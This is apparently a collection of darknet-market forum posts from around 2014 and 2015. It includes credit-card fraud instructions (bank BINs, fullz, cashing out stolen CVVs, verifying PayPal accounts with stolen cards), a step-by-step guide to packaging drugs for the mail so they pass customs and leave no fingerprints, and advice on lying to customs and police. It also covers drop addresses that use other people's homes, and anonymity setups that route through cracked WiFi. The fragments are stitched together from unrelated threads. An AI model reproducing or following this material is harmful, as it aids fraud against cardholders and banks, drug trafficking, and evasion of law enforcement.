I am booting TAILS from USB. Get a good one with decent speed at at least 16B space. TAILS is kinda special. They wrapped a 32bit userland mode into a 64 bit kernel.Means: Full 64bit support hardware wise (more than 2gigs of RAM), but only able to run 32 bit apps (due to security).Kernel is 64 bit, though. This gives you a hard time when compiling new shit. It is basically impossible. And TAILS is currently based on Debian 6. The new Debian wheezy is much better but still in the making. Release is end of April.Always use the currently released version or a good tested RC, everything else means security risks. Don't try to install much additional software, try to use what you got. Forget about virtualbox. I tried to compile their kernel modules for 6 hours now and failed. As said above, they have a pretty fucked up kernel/userland setup. Setup persistence to keep at least the apt packages. This way you only need to reinstall them on rebootcreate some bash script shortcuts to install necessary packages after each reboot. Firewall rules are in /etc/ferm/ferm.conf - this is important when using an android emulator. Most of them dont work, since they either require virtualbox (which does not work) or require a newer version of debian. Go with the android SDK. Install kvm and some necessary tools and you are good to go. Will have to see if it works. Currently I am testing the usage of Windows VMs. Main problem again is virtualbox. I am with plain qemu-kvm now. On my to do list is OpenVPN. I don't know how to use it inside TAILS, yet. I am not sure If i even want to.I got a 3g device, use TOR, and a socks proxy. That should be enough. They rather catch me withdrawing the money than tracing back this setup.

Looks old as fuck and outdated to be honest.Like their website and products are made for the early 2000's. My strategy and method is quite different and I'm the only one doing it right now. I provide a lot of live examples, templates, and a unique strategy in order to convert potential investors into real ""investors"". I also teach you how to gain thousands of real potential investors but only a % of them will convert. 5 copies remaining but probably 4 copies will remain tomorrow because somebody contacted me via ICQ earlier and they told me they wanted to buy it.

With untapped traffic sources that no one is actually using Logic and Business 101... and btw, Earning Earthquake is from HackForums.net and it is not something I personally wrote but it is a 50 page guide with client management software that teaches you how to run a completely legitimate white hat business.... LOL... I agree with you on the cheesy name but the actual product is still legit Also, I am re-writing this guide so it's going to be at least 20 pages.... The approach is original and novel and nobody else is doing it... That's the whole magic part of it Generally speaking, yes sure it's saturated... but it all depends on the way you execute and implement it....

PleasePoint me in the right directionI need a living tooVendor boggalertzNov 14, 2014 11:14 UTCBank Identification Number: the first six digits of a credit card or debit cardfor example 492181 is lloyds current account.try googling bank database and put in your personal card bins and see the resultsUser pr0tr33zNov 14, 2014 11:58 UTCTo start me off can you tell me exactly which card to buuVendor boggalertzNov 14, 2014 12:51 UTCbuy opus credit,User pr0tr33zNov 17, 2014 11:27 UTCbro can you take me step by step how to do this as im new and have no clue where to start?What listing shall i buy for the cc to add to the next account to add ad elivery address? Like if you could find me the listing that would be great, it would set me in the right motion. Once i've done it once I wont have to pester you again.User pr0tr33zNov 19, 2014 11:27 UTCHello. Please can you point me in the rifht direction of changing the address on fullz. I've search opus credit on the MP and ofrum and they both came back with nothing.can you not just go quiet and actually stand up to your customers please?Vendor boggalertzNov 19, 2014 15:41 UTCur killing me!get barclaycard then, same method, but they may ask home phone number and additional card holders, which is usually a trick question, the bin for them is 4929 or 530127,let me know if you need to know anything else-----------------------------------------------------------------------------------------------------------------------------------Now if there is another Vendor in the world that would be this patient, let me know..............................@pr0tr33z, you are now blocked. thankyou and goodnight"

Even if they do give it, doesnt mean its true. Risk it yourself, if its not an important part of your security setup. Wait for more good reviews like the one above but then risk waiting till its over used. They dont seem to have as many proxies as vip72, but they do seem to be way less used. Should know that super's software, will mess up your existing proxy software. Which sucks cause you cant stack em up. Well easily. Chaining it to Tor was as easy as vip72.

PROS and CONS:OPTION 1: the package might just be opened, as it would look like it has contents, but if its only examined with the naked eye, it would be very unlikely that anything would be found.however, if its examined in X-ray, then probably no stealth would help (is this true?) OPTION 2: the envelope is very unlikely to be opened, since it looks like a plain letter, but if its opened, theres no chance of it not being seen.  so some opinions say that option 2 is the best, as a plain letter is almost next to nothing likeyhood that it will be opened.and they say, if in any case customs decide to check something, itll be checked by xray in which case no stealth would help. and some opnions say that option 1 is the best, since you can never take chances of anything being opened, so just in case, if it is opened, the contents wont be obvious. so even if theres more chance of it being examined since it doesnt look like a regular envelope, but since its pretty stealthy, so it should pass... so whats the truth here? are both these opinions correct, but dpeneding on what substance or what country?how do i know whats best to my country? thnks!",""

In my opinion the easiest thing to import is LSD tabs, it's literally just paper soaked, you cant see or smell it. Importing anything illegal always depends on how much customs resources are available. If they have lots of mail going through they'll be rushing to check every item, or check fewer items slowly. Great stealth gets past the ones who rush when they check items, but nothing can stop someone who will take their time on every package. Countries that are known drug exporters will be checked more than first world countries. Its all a game of numbers, but when things get real and the unlucky chances land on you, just know how to use the law to protect yourself. Don't talk to police, ask for a lawyer, and your lawyer will make up a story for you. If your country doesnt provide you with a lawyer for free, then just say you don't know who's sending you the package, it must be an enemy trying to get you in trouble.

This may impact the type of stealth you choose.  A certain number of packages are picked out at random depending on the consignors destination. Columbia, morocco, etc are all places that would have a high number of packages selected for audit.  Then they the package, paperwork, and declaration. If there are any flags at all, they bring it to an xray scanner. Flags can range from not having a return address to a retarded reason for the product to cross borders. For example, why would someone from the UK order a tub of playdoh from Columbia?  If the product is sealed and has to be opened/damaged for inspection, they'll run it through an xray scan and if they find anything they'll open/damage it. If its drugs they'll obtain a sample for testing and confiscate it then make a decisions whether or not to investigate further or send a notice to the consignee that someone tried to ship them drugs. Lastly, its important to note, anything related to plants and food is definitely a flag. The reason is if someone sends LEGIT herbal stuff through the mail, which contains seeds, it could seriously fuck up an eco system. The herb in question may spread rapidly and be hard to control etc. A perfect example is the mice outbreak in australia that caused millions of dollars in damage. This is exactly why australia's customs are so strict.","plutopete wrote:A stealthy package should be able to be opened and checked and then sent on it's way There are thousands of products that are packaged with MBB's nowadays, so it's pretty simple to find one that looks similar on an x-ray to the product you're shipping.Once you've found a suitable product you either steal their packaging designs/labels, or you create your own labels and packaging to fit the innocent product you are imitating."

"Evolution Forums","HerrSchule","17112","2014-07-18T07:00:50","Safe Shipping Procedures","Security & Anonymity","As a vendor. You should take pride in your stealth methods. Instead of driving to the nearest gas station or grocery store to meet a dude. You're ass is shipping the product. Something that should take time and creativity. Improving stealth saves lives and money. So I feel this should be general knowledge and a must read.  First of all. I did not write this and do not take any credit. Sources will be included at the end. Over the past month, I've purchased from a few vendors and I feel as though some peoples stealth is sub-par. Its fcking scary how some packages even make it to the final destination. I've gotten a couple that raised multiple red flags according to clearnet. Scary! Vendor stealth is what keeps people out of jail and out of debt from legal fees. This is business and if you arent in it to win it, you need to take your ass home. As a customer, if you keep buying from someone who has shitty stealth. You're def not the sharpest tool in the shed. Tell the vendor if it sucked. Do it via pm pgp. I just had a long talk with one vendor and he took the advice. Hopeflly he changes. He's a good guy. Here she goes;  Hiniguel (SR) Okay, so lately I've been seeing more and more posts like 'How do I package X' and 'Is this suitable for packaging Y' so I have decided it is about time we have a generalized thread. I do not, repeat do not want anyone giving away specifics or anything, I am just going to write up a general guide of the precautions neccesary to packaging illegal drugs and posting them to others - remember we are a family here, and if you are posting drugs to your brothers or sisters from the community you better not fuck up because you're messing with their freedom. What you will need: - Disposable gloves (always wear two pairs at once, 1 still leaves fingerprints) - MBB's. ( I prefer buying it by the role and making my own pouch but you can get ready made ones - visit this thread if you know nothing about them as they are  neccesary don't begin vending without them: http://silkroad5v7dywlc.onion/index.php?topic=76.0) - Rubbing alcohol - Professional looking envelopes/packages - Labels (with a printer/label maker as printed addresses are a must, for your own safety and the customer) Okay, so I've covered what you need now here is what you'll need to do:   (I'll be using Cocaine as the example drug in this thread but this procedure goes for ANY drug.) First off, stick on your gloves. WHAT DID I TELL YOU? That's right, two pairs! Now, we will begin by weighing out all our Cocaine orders.. Lets say we have maybe.. 10 today. We weigh out each order accordingly keeping them away from the rest of our packaging equitment. I use a totally different room for weighing out/sealing than I do for packaging and printing. So, your ten orders are all weighted out. Take the currents gloves you have on which are most likely contaminated with miniscule amounts of cocaine - enough to trigger a dogs senses though -, off. Put on new gloves, again you'll need two pairs for your own safety. Take your MBB pouches and place the freshly weighed out delicous looking drug inside and seal it. Now, apply rubbing alcohol all over the outside of the MBB. This will destroy any trace amounts of the drug lying on the outside of the pouch. Take this small freshly cleaned and sealed pouch and stick it inside another pouch and repeat the process again. I always recommend at least double, or triple sealing your product with each layer being alcohol washed. Okay, so at this point the product is clean, sealed and ready to rock 'n' roll. Here's where you'll need an imagination. You need to disguise your product on the inside in case of the event that customs open up one of your packages. Think about what you've had sent to you, by vendors, or by so called 'legitamate' businesses. What did they have? What was included? Invoices? Gift cards? Little crappy peices of marketing from other businesses like flyers?  **This shit is hot***  Figure it out! I'll leave that for you to decide but be clever about it. Keep it as advanced as possible while making it as simple as possible so it doesn't take you 16 hours everyday to package 3 orders. Another thing, if you ship pills, don't disguise your product as a 'powdered tea' because if customs open it and have a feel, they are going to think 'why is this tea so hard?' Like I said, be clever. So, at this point I'm hoping you have your product sealed, disguised and your envelope/package sealed up.  What's left to deal with? The outside of your package. Keep it simple - Printed labels, for both the receivers name and the return addres (always use a return address roughly in the area the product was posted. A return address is neccesary in my opinion, escpecially if you are going all out to disguise it as what business doesn't have a return address?) You can fire a logo or something else on it if you like, but it's not neccesary but it can make it look nice. Remember to stick the adequate amount of stamps on, as you don't want your product to be sitting in a postal service sorting office for longer than it needs to be. Plus, your customers will want their drugs asap. All packaged up and ready to go now are we? I think we are. Take them to the post box then. HOLD UP.. Did you just carry them to a post box in your own hands? You did.. Well, you've just put your finger prints all over the package. Do you work in any kind of postal service or have any legitimate reason to have touched this personals mail, cause if you don't then you're fucked especially if LE have your prints on file. Always wear gloves when you are doing a drop, or have something that stops you having a direct touch with the package I hope this can help some people at least, if you package properly then there really is no reason you or a buyer should be a risk. Of course there will be a few packages that get seized just out of bad luck, but as a whole you'll be good. In my time as a vendor on the old site (operated under a different name) I had about 3 international packages go missing out of 300+ using the process above. Be careful, be secure and be safe everyone. This is our time to shine. :) Other things to remember - will be updated often, if you have any input just say and I'll add it: - When buying stamps, wear gloves or have someone else that doesn't have LE's prints buy them for you. Your prints can end up all over them. - Use different drops all the time. Try to have like 5-10 that are all a good distance away from each other. - Never use the same drop two days in a row. - If you see anything/anyone looking suspicous at the drop, walk away and try a different drop the next day. You never know whos watching. - And remember to change the appearance of your packaging often to avoid package profiling.Â« Last Edit: November 06, 2013, 10:44:50 pm by Hiniguel Â»NO LONGER LISTING - STILL ONLINE IF YOU NEED ME PM ME I WILL GET BACK TO YOU.  http://www.deepdotweb.com/2013/11/26/point-for-safe-shipping/  (LIST OF RED FLAGS AND PROCEDURES - READ) http://silkroad5v7dywlc.onion/index.php?topic=2253.0  (This Thread) -----------drugs mail shipping stealth methods safe procedures help mylar mbb vacuum seal tricks tips fingerprints stamps boxes envelopes tape ups usps fedex dhl",""

Guide Covers how to FUND and VERIFY a paypal account in 2 different ways.


VOUCHED BY 2 vendors 

DISCLAIMER: DOES NOT COVER HOW TO TRANSFER ONLY HOW TO VERIFY/FUND AN ACCOUNT!!;If you're a Paypal veteran, then you already know this method. For everyone else, buy this now.-Nancy;Wrote to him and got vouch.Here is my review:Its pretty easy and works.You only need a live cc and burner phone.Very easy and if you do it right it will workTy for the guide and good luck with the sales;Received a vouch copy. The method is solid, in fact it's the only way I verify my accounts.If you're a Paypal veteran, then you already know this method. For everyone else, buy this now.You'll also figure out that this method can be used in situations where you need to verifyother accounts as well, not just Paypal.This is probably one of my shortest reviews, but that's really all you need to know.Cheers,Nancy;I've read the guide and i can say that every Paypal Expert surely know this method but if you are a noob i suggest to buy it.The method is already working and the possibility of saturation is low but this guide is only one passage to win against Paypal, if you know how to use the money in pp account and cashout them the potential to make a lot of money with the right resources is high.The guide go straight to the point, it's easy to understand for everyone.I definitely vouch for him. Good Guide for a low price."

I've written an end to end guide for newbies, from getting your first CVV to cashing it out. The guide does not have some all secret knowing method, it just teaches you methods that will work that you will get a return out of. Finally you can stop burning all those CVV's you buy and actually do it properly. If you want to stay safe, learn the right techniques and get some use out of the pizza's you buy this is the guide for you. The idea is to get you from newbie to a carder making a bit of money if a couple of hours. If you want something bigger with high returns go pick up Yasuo's guides. This guide really is for the beginner who wants a bit of beer money and to learn the basics to build up. Vouch copies for reputable reviewers only, questions welcome.","http://k5zq47j6wd3wdvjq.onion/listing/8019"

I'm trying to teach you how to fish here rather than just giving you the fish. The guide includes methods to get your funds to a clean paypal or to exchange for bitcoin. And yes all that is required is non burnt, valid CVV.

This guide shows you how to get a good reliable system setup, and then how to grow that system. You're more than welcome to wait for feedback, I'm not going to hard sell this item. It's at a low price to provide little risk in trying it and to give newbies a simple guide that they can try without wasting too much money, $10 is nothing and is a lot less than wasting money on CVV's people don't know how to use properly. The guide is ~7500 words, I go into a lot of detail about each step, making sure there is no margin for error.  Again if you don't want it I'm not forcing you. Yes there are some basic methods here, but its learning how to string them together. It's cheaper than getting an invite to TCF, its up to date unlike a lot of the wiki articles and is designed to take you from no knowledge to being proficient so of course there is going to be some basic stuff here as people need to learn it to move on. However in my guide I show you how to apply it and build on those skills with more advanced knowledge. I wrote this guide because even when people do read all the articles around they still end up burning cards, or accidentally having a DNS leak. I take people right from the beginning to cashout, and show you how to setup cashout accounts etc. Far too many people have spent $100+ on buying cards and not making a dime out of them.","bitcoinrudolf wrote:And this methods operating how much $ can be cashout ?;RandomDude wrote:So i spend 2 hours reading your guide ??

After you get them all set up, it's just about keeping them on and maintaining that. You have no future investment, nothing past the $15. Like I said to many other members too, with this system it's better to be helping each other than to do alone so I'm more than happy in any way to get you set up if you're confused at all, though you won't have too much trouble as I wrote explaining all of my process+some tips I use that make it better/faster/easier for me. I make $50+ a day right now, and I've got only around 50-60 accounts running atm, but I have around 150-200 accounts, I just haven't had time around the house to get the rest of them logged in/earning. So when I get those running think about the cash there, then we're talking at least $100 a day, because not only do you get the funds in your account for referring people that are watching, you also get the funds in the accounts that were referred because you made those accounts:) Going to take care of some stuff outside the house be back in about an hour, I sent a copy to HighAsAKite, hoping he gets back to me by the time I get back! Like I said, let me know if you have questions guys.",""

You don't need an amazing high end PC, you just need tons of accounts that you create linked together -- ultimately linked back to your main account. You keep them all logged in on your PC throughout the day, and you receive funds in your account in turn. After receiving a certain amount of funds you go to their catalog and purchase $50 that they send via check in the mail. They're also working on getting debit cards set up in the future so instead of sending checks they just drop the funds on your card once you gain the cash! This opportunity is just starting, I literally got a blessing and found this before it got big. Please guys, feel free to ask any questions(except shit like what's the site;p lol), I'm happy to help anyone out, and like I've said previously if you have any issues understanding the guide or any personal questions I'll help out no problem!

There are a few mistakes in his grammar, and also, some words are eaten out, which clearly depicts that the author does not primarily belong to the US of A. 2) Method : A warning, first of all : This method is not for the lazy ones. It requires you to pick up your arse, and making trips to a certain bank. Top Tip : The bank is one of the ""Big Four"", and your face will probably be captured. Although the OP fails to mention it, but you will be requiring a lot of gas and a decent ride, for this method. The OP recommends not to attempt this near your locality, that's why. And also, this method can only be attempted with one branch (of the bank). Although you can hit it 2 times, but, that's just based on your luck. (Personally, I don't believe in it). You cannot attempt this method where the branches are located really close to each other. The Bank will sense the pattern and you will definitely get arrested. Furthermore, you will be needing a lot of cash for this kind of method to work and generate some profit. It'll be really a coin minting machine, if you hit it in teams of people. PROS : 1) Method is new.2) You CAN double your money. CONS : 1) The bank you'll be visiting will capture your face. I suggest wearing a silicon mask.2) You will be needing an ID.3) Cannot work with the same branch twice. As I said, it *could* be attempted, based on your luck.4) Startup cash *is* required. 5) Pathetically high priced, for a guide that's not even a page lengthy. But, ultimately, it's for the OP to decide on the pricing. (EDIT : The guide was priced 4 BTC before this review)6) Once attempted, the method will be short lived.7) Is a difficult method. Final Verdict : Newbies : Steer Clear (0/5)Advanced : This method is relatively easy when you have the confidence and the required tools to go with it(i.e., Cash, Gas, Car). A must buy for people hitting it in teams and people who have pathetically high bank balance.  (3.5/5)Difficulty Level : 4/5 ------------------------------------------------------------------------------------------------------- arcana.

About three years ago I ordered 10g of phenazepam (legal benzodiazepine) from China. It didn't show up for a while and I eventually got a refund. However, about a year after I first ordered the package, it arrived in the post. It was clearly opened and resealed. There was literally powder stuck underneath some of the tape. I opened the package and found a bag with 9g of powdered phenazepam with a lime-green sticker on it that said ""DEPARTMENT OF HOMELAND SECURITY"" and their logo. My guess is that customs found a bag of white powder and decided to test it. When it turned out to be a legal substance, they had to ship it to me.

BUT, sure, you may get away with it. Everyone does. Then suddenly you're in cuffs.  Also, many states have Analog laws now that would cover phenazepam. They're so broad they might cover coffee, so haven't been challenged in court. Basically, anything that makes you feel like an illegal substance is also illegal.

You can also find friends that will accept the package for you, But you would have to give them a payday out of it and school them on what to say if worse comes to worst and something comes back and they do end up questioning them, Something along the lines of, "" no I did not accept anything"" or ""yes I accepted a package at my house because it was addressed to me and shortly after a man knocked on my door and told me that he lives down the road and told me that he was here to pick it up"" make sure that the person or people you use as drops are trustworthy, You can use alot of people's addresses and have carded stuff sent there and not raise any suspicion or any comeback if you play it right.

UPS have a tool /database computer where they can check exactly who is living in the house (who is in on the tenancy), Its similar to the tool that Ebay use to find out information, and if the house is vacant, It flags up. And the order gets put on hold or shipped back to the sender, I have personally experienced this many times with UPS, With Apple and other retailers, and its common knowledge whilst using vacant houses, Almost makes it not worth it. UPS drivers are also told to look for any signs of a vacant whilst delivering and if they spot anything they wont deliver it. Secondly, You do not know what address I am giving them companies, Maybe the address of a buyer or another drop address, You do not need to use your real address, Your the one who suggested that, Not me. I was saying a way to get a drop address.

Check their sourceforge page for more detailed info about the possibilities of the software.For MAC spoofing there are two possible options. Either via iproute2 or macchanger. Good source of information is ArchLinux wiki, they cover both methods. Do keep in mind that the part of the wiki page that covers automatic MAC spoofing might not apply to your situation as not all distros employ systemd. As for other 'crucial' software... I really don't know. I've been on evo and deep web for less than a week, trying to get into carding and still haven't settled on my own system. Depending on how paranoid you are (I am very paranoid, for example), you might want to look into proper system hardening, including somethink like SELinux, AppArmour, grsecurity, etc... Also, TRESOR or loop-amnesia, depending on how paranoid you are and what system you have.   Cheers","Midnight_Sun wrote:Thanks, that's good to know.

I've joined private internet access a long time ago.  Since i'm only a noob i need help...

So im using right now Tails linux but i don't have problem of changing this I'm only worried for my privacy.  I don't care much about that f* account in private internet access if they don't help me. What kind of service do you use? Is possibile to use only TOR -> SOCKS5 and be safe? If yes, how???  What is your solution to stay anonymous? I know we cant be 100% anonym and blah blah.... but i wanna learn as much as i can to hide my ass. I still haven't done ANYTHING that can drive attenction to me (nothing illegal, im f* clean) Plus i can still use my laptop across all my country though free wifi but is not easy for me doing shady things in public, i'm afraid of being watched while i'm in the crowd.

And I stopped trying as I found the setup to be nasty. With regards to Tor-systems like Liberte and Tails, you'll like run into the problem of setting up a loop, because they use strict iptables, making your VPN run through Tor and Tor through VPN. If you are careful, however, you can: 1) Install any regular OS (Windows, Linux distro, etc.)2) Install Tor Browser3) Install OpenVPN4) Fetch your VPN providers OpenVPN config5) Add socks-proxy 127.0.0.1:9150 (iirc) This way you can have a both private and anonymous connection.

Wipe clean, clear cookies, run crap cleaner and implement other cleansing that one does before logging on and then do this: 1. Run TOR (configured however you want to based on the level of opsec you desire or whatever). I always run it as admin if using windows OS but am unsure this makes any difference. 2.  Run openvpn client as admin (this is critical) then connect via the ""mullvad"" option, should only be one as this is the only config file you have in the openvpn directory.  As you add more  vpn configs this list will obviously grow.  The interface should open on the screen and you can watch each command line run as openvpn implements the mullvad configuration for the vpn connection. 3.  You should now be tunnelling Tor through mullvad however all mullvad see's is a anonymised connection running through their server as its encrypted via the Tor network.  Your ISp however will see that you are connecting via Tor which may present other issues... I am 95% sure this is connecting to your vpn anonymously however if someone can refute this please say so as I am not a full IT nerd.  The only other sure fire way is via a vm in conjunction with whonix.  Very technical but if you get it working then it's impossible to connect to anything outside the vm unless via Tor as every channel is torified as this is the whole purpose of whonix.",""

So maybe as you can think - i'm looking for a possibility to order at evolution without telling the vendor my name!  I already know all the public possibilities like, use empty house, stay in the garden of your neighbor until the postman comes... shield-shipping(which seems to be down). But these are all options that don't really satisfy me. So does anyone know a better possibility? Otherwise could anyone tell me what chances are to be catched if i only use domestic parcels? And at least does anyone know what would happen if the parcel would be catched? I haven't found anything via internet about it. But i think - Anyone could order to anyones address so i think it wouldn't be a evidence which will lead to a house search?  Thanks for the answers.

This is a beginner/intermediate guide for those looking to expand their knowledge surrounding hacking techniques and want a good base to start. This guide is designed to fill that âvoidâ as a beginner hacker while learning your new found skills. Itâs important to be able to practice in the real world without being caught, arrested or questioned which would have a negative impact on your learning ability and career. This is step one is concealing your digital footprint and staying out of sight while mastering the art of hacking.  This guide also discusses the tactics used today when youâre unable to brute force a WPS PIN or crack a WPA/WPA2 WiFi network password. WiFi hacking has progressed so that most networks are not vulnerable to WPS PIN brute force attacks or the WPA/WPA2 passwords are very complex which cannot be cracked.

We'll see how the demand works out before we commit our time into completing another guide.  The guide contains plenty of articles, papers, and other resources that will help build your knowledge from the ground up and give you a solid understanding in concealing yourself when learning hacking as a new skill. It contains the tools, commands, and syntax needed to follow along with the guide and an explanation of what the tools, commands, techniques all do. That being said there's no need for follow up support as everything is clearly outlined in the guide and as a customer you'll realize this. Unfortunately there is no vouches for this guide. It's currently at a fixed price and will remain at that price for the first (10) purchases.

Nearly 1 month ago I ordered 200 pills to my real name and address in South America, and a few days later I received a letter in my home saying that my package was retained for the customs (I don't know why, maybe related to the volume) and I have to go to the central post office in my city and ask for my package. I won't go because they open the package for law importation, I will leave it there and do nothing, I guess it will return to the sender, right? But probably the sender's address is fake. The package will be sent to that address anyway? I just want to get rid of it, or I hope a refund or reship, at least 50%. What do you think about this situation? Please, I would appreciate any kind of opinion. Thanks

If a person gets a letter from customs saying they have to come collect the package , they are most definitely going to drop in and see what it's about. If you don't show up , customs could suspect you of something.  To OP , go into customs and tell them you have not ordered anything recently , your not expecting any presents or gifts and act very confused about the matter as Marty said. If you want some other opinions search the forums for similar threads and you will see some more reputable members advising to go into customs and deny knowledge of the package.","elpity wrote:If you go, they open the package and you'll have some unwanated heat on you.Leave it there, I'm in you same situation.It will return to recipient's address and get lost.;TodBoonfield wrote:I wouldn't go get that buddy, not worth it."

You paid for a product. 2 days after and SR2 is seized. That now leaves the vendor (who probably has hundreds if not thousands of customers and cannot be expected to remember every order, and probably works in more than a one man team) with a choice of either risking to send the product where there is no marketplace to protect him and he can't refund you the BTC because he doesn't have a BTC wallet address for you and you probably can't get hold of him now because he's probably changed his vendor name to something else and is operating on another marketplace. You have to understand that if it was you dealing with losing pretty much a FUCKLOAD of custom and I can bet being a popular vendor on a site that got seized is a daunting experience when you have to remember that the site doesn't just go down and get thrown in the trash, it gets duplicated and analyzed and ripped apart. I'd just call it a loss. The market got seized buddy, I doubt he deliberately fucked you over or maybe he did, maybe because there isn't the protection of a community backing this vendor anymore; he knows he can just not send the product out and move on from it. Either way, what do you think the chances are of you getting your product or your BTC back when SR2 ain't coming back and if it does, who's going on to be using it? The same vendor? Doubtful.

From what I have read on redit and other sites, some have said it was LE trying to obtain customer addresses when they seized sr2. They were phishing for people that were dumb enough to send their address unencrypted and then bust them. I almost sent a pgp message to my vendor if it wasn't for me getting the package THAT DAY. I thought is was somewhat odd that a vendor would send me a message looking for my address after they already mailed it. I really hope that you sent it using pgp. If not, I would probably find a new drop point, or do not accept or sign for any packages bought from dark markets. You should let things cool down for awhile and maybe order something from a legal site and see if anything is strange... Good luck.",""

They're one of the most popular if not the most popular VPN services out there. The owner's are making bank. They say they don't keep logs so it's impossible to hand over information they don't have. I believe they don't log... unless asked to by the Feds who provide evidence to PIA of criminal conduct. Then PIA will make an exception to keep the dollars coming in. Find 2 reputable VPN providers. Buy a month of service with one or try out their one week trial (many VPN providers provide this). Take off and find a public WiFi spot and connect to VPN one. Buy second VPN service with bitcoin.

Some of that is like sites like PayPal and such being able to see things like your MAC address, HDD serial number, and even your PC account name. Now before I got into the deepweb and the things that it contains, I did selling on ebay using ebay and PP stealth accounts for years. I pretty much learned my ways of doing that through the ebay steath guide and the Aspkin forums. I'm not sure if anyone here is familar with those. In either case, I remember the guide even jokingly saying ""No, ebay/PP cannot see your MAC address, your HDD serial #, or if you brushed your teeth last night."" But here I see statements in mountainhigh9's guide saying the contrary. I mean these Aspkin forums from which the ebay stealth guide (as well as Amazon Ghost) originates are hardcore about the ways of being stealthy, anonymous, and getting around ebay/PP to continue selling should you have accounts banned/limited/whatever, and the main ways of staying anonymous for them were like using a mobile broadband stick (since these give you new IP's on each connect and ebay/PP can see if you're using a VPN/proxy which they don't like), creating separate PC accounts for each of your ebay/PP accounts (since this keeps cookies/flash cookies separate and you don't have to keep deleting them which raises flags with ebay/PP), as well as other things like VCC's/VBA's for verifying accounts and yada yada yada, but never had I seen anything anything about a website being able to see your MAC address, HDD serial #, or even your PC account name. Is there any truth to this? I know they suggested never downloading and running anything off your PC that COULD read your MAC address like ebay's turbolister or even installing PP's plugin, so ya.

I just switch up IP's between accounts (this is pretty much done automatically when connecting a mobile broadband stick), use separate PC accounts to keep cookies/flash cookies separate, and ya. Of course having account details be different too like name, address, VCC, VBA. That's a given.

These technologies are not openly avilable but alot of ad racking companies are now using them since everybody installed adblocker and turn off cookies, private browsing etc. Changing your IP address alone hardly does shit. They can still see your internal IP if you haven't also changed that.  Spoofing your mac address also allows you to deny ever being the one that was connected to the network or ISP if you get caught in the act. You need to randomize everything, don't even have the same addons installed or the same fonts etc , switch it up. I never knew until last week that a website can put a request in header metdata and in a covert flash file to see every font on your system, thus narrowing down how many users has this unique combination of addons and fonts (mine is currenly one in a million which is way too high).... Changing mac address takes 2 seconds, but I guess some people would rather do time in jail or pay a ridiculous fine.  You need to stay one step ahead of the competition. You think they don't know about proxies by now and switching users on a computer, spoofing cookies? This is their full time job, huge companies pay people to do this shit. Your just one person by yourself refusing to take free advice from people that have more insight than you. EDIT: 500th post. Buy my shit!

I am pretty sure you can buy a prepaid card, activate it online (practice proper OPsec..) and then use paypal to print shipping labels at a discount. They can then be dropped into the blue boxes, even if over 13 oz as long as it fits and is prepaid with a printed label. You don't want to use a stolen cc to pay for postage, since in case of chargeback, the mail could be intercepted if not yet delivered.",""

I've also read a number of setup thread but most of these setups are for carding/paypal, this is not of interest to me. However, I still have a couple questions if people can help me clear a few things up. 1. Can people give there opinions on this setup? I plan on opening a vendor account and I want to make sure I'm safe as possible. For clearnet activities;Burner laptop > OS kali Linux (drive encrypted with *?*) > hacked wifi > VPN > Virtual box > Windows XP > VPN > Sock5 > Firefox (in safe mode) With regards to hacked wifi, the further the wifi is from you the better? For Darknet activities;Burner laptop > OS kali Linux (drive encrypted with *?*) > hacked wifi > VPN > Virtual box > Tails  > Tor Does tails still create a ramdrive if it is run through a VM? Are these setups safe? Can anyone tell me where I can improve or if I need to? I will be vending Prepaid cards to start with if it's of any help. 2. I have be searching online but can't seem to find an exact answer. Bitcoin addresses and IP's, how hard are they to link? After I receive funds from a transaction on Evo is this a safe withdrawal method. Evo > tumbler > tumbler > offline wallet such as Electrum or Multibit? Are two tumblers needed? The wallet will be stored on an encrypted usb within an encrypted hidden volume and hidden in a very safe location. EDIT: It has just come to my attention that Truecrypt 7.1a is not compatible with Linux OS hence the (*?*). Kali as the host OS is a must for hacking wifi. 1, Because public wifi is impractical where I'm situated and 2, 3g/4g dongles are a bad idea from what I've read. Can anyone suggest a viable alternative? Any information regarding my questions is much appreciated.

"Evolution Forums","quietForest","44857","2015-01-24T10:50:48","Re: Questions?","Security & Anonymity","Linux uses LUKS/dm-crypt. Yes, the further the cracked wifi the better. Best practice is uni-directional, not in a circular pattern. Kali will make it easier to crack the wifi, but Kali isn't necessary to do that. You should also takes steps to spoof your mac address before you even start cracking (each time), and ideally you would do this before the wireless card is made active to prevent it from broadcasting your true mac. In your clearnet example, know that the only thing that will really protect you is the cracked wifi. The vpns won't. Also be sure that all vpns used are set up and paid for anonymously. In your darknet example, Tails is Tor, and you never want to run Tor over Tor. As of writing this I've never used Tails in a VM but I know of no reason why it wouldn't create a ramdrive. I do know that Tails checks to see if it is being run in a VM (for compatibility with the hypervisor). BTC addresses/transactions and IPs are not hard to link. Two tumblers aren't strictly needed, but if one of them is run by LE they will only have the incoming address or the outgoing address not both. Also not a bad idea to change HDs as popadoppalus mentioned but might not be strictly necessary. Same with the NICs. Very easy on almost all laptops.  @popadoppalus - I think the idea of a 'burner laptop' is more to the tune of being burnable if needed, not as standard practice. Might be wrong in some cases tho.",""

"Evolution Forums","Treekle","44857","2015-01-24T15:51:27","Re: Questions?","Security & Anonymity","Thank you for your reply. Well that's a risk I will have to take. I could hack small business's wifi that are within a mile radius if that's better? By Tails > Tor in my setup I didn't mean Tor > Tor if you get me. Just the Tor browser built into tails. When you replace the HD of a laptop and freshly install Kali on new HD for example, what other identifying info can be obtained from said pc. (Besides mac address) It's more for peace of mind. I would like to keep any illegal computer activities on a throw away PC bought with cash off the likes of Craigslist. This way I can be 100% sure the is nothing related to my personal life on it. It is more a burnable laptop as quietForest says, If all goes well I will keep the same one indefinitely but can be destroyed if needs be. As a hacker I'm sure you have different pc's for work, hacking, home etc? This is to avoid mapping? So leave antenna pointed North regardless of location for example? How can you prevent your wireless card from becoming active? Wouldn't it become powered as soon as the laptop is? Yes I understand VPN providers will give up details upon request by LE, they are additional layers which in my opinion won't hurt  I meant the built in Tor browser. Good point about the tumblers.  When you mention changing HDs, is this really necessary? If my setup is as mention above with the addition of spoofed mac, do I need to worry about the HD?

I have seen PCMCIA NICs with jacks, but you don't see PCMCIA slots any more. anyway for most activities unless you are downloading porn you don't need a 5 TB drive. 10-20 GB is more than ample and you can buy them for $20. just get a burner HDD. if you want you can even stash em somewhere far removed from your house in case you ever need them. on most laptops it is easy to swap hard drive. easier than a desktop.put away soapbox.;quietForest wrote:Linux uses LUKS/dm-crypt.Yes, the further the cracked wifi the better.

